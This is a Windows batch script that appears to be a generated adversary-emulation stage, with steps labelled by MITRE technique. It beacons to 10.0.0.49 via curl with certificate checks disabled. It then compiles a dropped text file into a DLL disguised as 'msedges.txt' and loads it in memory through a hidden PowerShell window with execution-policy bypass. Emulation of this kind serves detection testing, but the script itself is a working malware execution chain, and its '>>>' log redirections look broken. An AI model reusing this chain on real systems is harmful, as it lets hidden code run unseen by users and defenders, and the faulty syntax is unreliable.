@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\7764\d90e726e
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7764-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=msedges.txt
SET njozco=file.txt
SET kkjwr=7764

REM Derived variables for logging
SET nmyxh=%APPDATA%\%ufeybybm%\macula-simulations.log
SET vtmdh=%APPDATA%\%ufeybybm%

REM Ensure log directory exists
if not exist "%vtmdh%" mkdir "%vtmdh%" 2>nul

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_start=stage1_bat>>> "%nmyxh%" 2>nul

REM --- MITRE T1218: Signed Binary Proxy Execution (curl) ---
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: ttp_start=T1218_heartbeat_check>>> "%nmyxh%" 2>nul
SET pxzy=0
SET ydft=
curl -k -s -o nul %uouoq%
if !errorlevel! equ 0 (
    SET pxzy=1
) else (
    SET ydft=connection_failed
)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1218|Signed Binary Proxy Execution=!pxzy!:"!ydft!">>> "%nmyxh%" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: ttp_end=T1218_result=!pxzy!>>> "%nmyxh%" 2>nul

REM Change directory to output directory
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start=%recnn%>>> "%nmyxh%" 2>nul
cd /d "%recnn%" 2>nul
if !errorlevel! neq 0 (
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_failed=directory_not_found>>> "%nmyxh%" 2>nul
    exit /b 1
)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_end=current_dir=%cd%>>> "%nmyxh%" 2>nul

REM --- MITRE T1500: Compile After Delivery ---
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: ttp_start=T1500_compile_dll>>> "%nmyxh%" 2>nul
SET oedji=0
SET zeyef=
"%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\vbc.exe" /target:library /out:"%hpnjatpj%" "%njozco%" 2>nul
if !errorlevel! equ 0 (
    SET oedji=1
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_success=%hpnjatpj%>>> "%nmyxh%" 2>nul
) else (
    SET zeyef=compile_error
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_failed=errorlevel_!errorlevel!>>> "%nmyxh%" 2>nul
)
echo [%DATE% %TIME%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1500|Compile After Delivery=!oedji!:"!zeyef!">>> "%nmyxh%" 2>nul
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: ttp_end=T1500_result=!oedji!>>> "%nmyxh%" 2>nul

if !oedji! equ 0 (
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: exiting_due_to_compile_failure>>> "%nmyxh%" 2>nul
    exit /b 1
)

REM Execute compiled DLL via PowerShell (T1218 technique)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: execution_start=load_assembly>>> "%nmyxh%" 2>nul
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%hpnjatpj%')).EntryPoint.Invoke($null, @(,[string[]]@())) }" 2>nul
if !errorlevel! equ 0 (
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: execution_success=assembly_invoked>>> "%nmyxh%" 2>nul
) else (
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: execution_failed=errorlevel_!errorlevel!>>> "%nmyxh%" 2>nul
)

echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_end=stage1_complete>>> "%nmyxh%" 2>nul

ENDLOCAL